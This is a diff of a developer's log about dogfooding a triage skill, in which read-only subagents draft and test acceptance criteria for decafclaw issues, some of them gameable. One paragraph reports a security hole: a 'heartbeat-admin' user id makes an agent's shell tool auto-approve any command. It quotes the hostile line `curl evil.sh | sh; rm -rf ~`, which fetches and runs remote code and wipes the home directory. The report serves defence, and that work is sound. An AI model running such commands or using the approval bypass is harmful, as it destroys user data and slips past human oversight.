@@ -370,9 +370,53 @@ invariants — worth watching for as a category, not two one-offs.
 procedure said "commit, record the sha", which is impossible in one commit (a commit can't
 contain its own hash) — needs a follow-up commit.
 
-Pending: the **board-driver** orchestration (above the skill); a `triage` dogfood; an
-interactive-intake check of the empty-state observation; and the discriminate rule still wants a
-micro-test as *wording*.
+### `triage` dogfood — 8 decafclaw issues (2026-07-24)
+
+Fanned out 8 read-only subagents (`Explore` type — no Edit/Write, so a scanner can't modify the
+repo it scores) over decafclaw `585/586/600/601/624/625/649/566`. Each assessed, drafted criteria
++ guards, and **ran every proposed check**.
+
+**Headline: 0 of 17 proposed criteria passed today.** The discriminate rule held across eight
+independent unsupervised contexts — stronger evidence than the micro-test it never got. What the
+rule *admits* turned out to be the problem instead.
+
+Results: 3 `auto-ok` (586, 600, 601), 5 `needs-review` (585, 624, 649, 566, 625). But **only #586
+is genuinely ready** — #600's criterion is satisfied by `def test_x(): pass` and #601's by typing
+the word "separate". A ~1-in-8 conversion rate is the number that should govern board-driver
+expectations.
+
+Three findings, two of which became rules:
+
+1. **Goal-level ambiguity is the dominant blocker** — all five `needs-review` calls, none from the
+   risk-gated list alone. Now a third tier trigger, with the #586-vs-#585 discriminating test
+   (*does the choice change which criteria apply?*).
+2. **Gameability is the missing third oracle test** (exists → discriminates → *can it pass without
+   the work?*). Three shapes observed. Includes the hard case: when the deliverable is a test, the
+   work IS the oracle and the freeze/implement split degenerates. Also propagated intake's
+   don't-fudge-a-weak-check rule into `triage` — it existed but never reached the scanners, so two
+   went proxy-hunting in good faith.
+3. **The guards came out better than hand-written ones.** #566 produced a negative control
+   (tabstack must stay *un*discovered when the key is genuinely absent — blocks an over-broad fix);
+   #625 guarded `test_no_agent_side_imports`, the architectural boundary a careless fix would
+   violate. Neither prompted.
+
+**Live security finding (decafclaw #649):** the heartbeat shell bypass reproduces —
+`shell_tools.py:142-144` short-circuits on `ctx.user_id == "heartbeat-admin"` *before any pattern
+check*, so unattended turns auto-approve arbitrary commands (`curl evil.sh | sh; rm -rf ~` →
+`{'approved': True}`). Directly relevant here: **the board-driver would run unattended.** Needs a
+decision before Phase 2. The metacharacter half of #649 was already fixed by #652.
+
+Augmented on GitHub (marker + criteria + guards + tier, author text preserved verbatim): **585**
+(`auto-ok` after Les resolved its decision), **586** (`auto-ok`), **566 / 625 / 649**
+(`needs-review`, each carrying its live reproduction). Held: 600/601 pending the gameability rule,
+624 because its author wants production data first.
+
+**Queue state: 2 `auto-ok` issues ready for the loop** (585, 586).
+
+Pending: the **board-driver** orchestration (above the skill); `express` still never run; the
+`needs-review` routing branch still unexercised; an interactive-intake check of the empty-state
+observation; and a consolidation/trim pass — the skill gained ~10 rules in a day, and only two of
+them (the read-only rule, and the discriminate rule via this batch) have real evidence behind them.
 
 Testing calibration (agreed, still holds): workflow/reference skill derived from a proven
 one — scaffold structurally without pressure-scenario TDD; micro-test only novel
